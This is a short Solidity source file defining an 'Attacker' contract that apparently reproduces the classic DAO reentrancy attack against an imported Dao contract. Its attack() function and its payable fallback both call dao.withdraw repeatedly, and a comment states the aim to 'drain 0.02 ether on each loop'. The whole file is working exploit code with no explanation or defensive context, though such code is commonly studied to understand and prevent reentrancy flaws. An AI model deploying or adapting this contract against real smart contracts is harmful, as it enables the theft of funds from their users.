pragma solidity ^0.4.11;

import './Dao.sol';

contract Attacker {

	uint public counter = 0;
	uint constant stackLimit = 10;
	uint amount;
	Dao dao;

	function Attacker() {
		// drain 0.02 ether on each loop
		amount = 2*10**16;
	}

	function setDaoAddress(address daoAddress) {
		dao = Dao(daoAddress);
	}

	function attack() {
		dao.withdraw(amount);
	}

	function() payable {
		counter++;
		dao.withdraw(amount);
	}

	function getBalance() returns(uint) {
		return this.balance;
	}
}
